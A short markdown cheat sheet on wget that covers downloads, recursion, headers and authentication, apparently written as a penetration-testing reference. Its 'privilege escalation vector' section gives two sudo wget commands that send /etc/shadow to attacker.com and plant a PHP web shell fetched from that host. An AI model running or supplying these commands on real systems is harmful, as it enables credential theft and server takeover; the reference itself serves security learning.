# wget file downloads because getting files from remote.

## basic usage
```bash
wget https://example.com/file.txt        # download single file
wget -O newname.txt https://site.com/file.txt    # save with different name
wget -c https://site.com/largefile.zip   # continue interrupted download
```

## recursive downloads
```bash
wget -r https://site.com/                # recursive download
wget -r -l 2 https://site.com/           # limit recursion depth to 2
wget -r -A "*.pdf" https://site.com/     # only download PDFs
```

## useful options
```bash
wget --spider https://site.com/file.txt  # check if file exists (no download)
wget -q https://site.com/file.txt        # quiet mode
wget --user-agent="Custom Agent" url     # custom user agent
wget --header="Cookie: session=abc" url  # custom headers
```

## authentication
```bash
wget --user=username --password=pass url # HTTP basic auth
wget --certificate=cert.pem url          # client certificate
```

## privilege escalation vector
if `wget` in `sudo -l`:
```bash
# can transfer files as root
sudo wget --post-file=/etc/shadow http://attacker.com/upload
sudo wget http://attacker.com/shell.php -O /var/www/html/shell.php
```

## notes
[!] recursive downloads can grab entire websites - use carefully
[!] `--spider` tests availability without downloading
[!] sudo wget can read/write files as root - major privesc vector
[!] some files may not be readable without proper permissions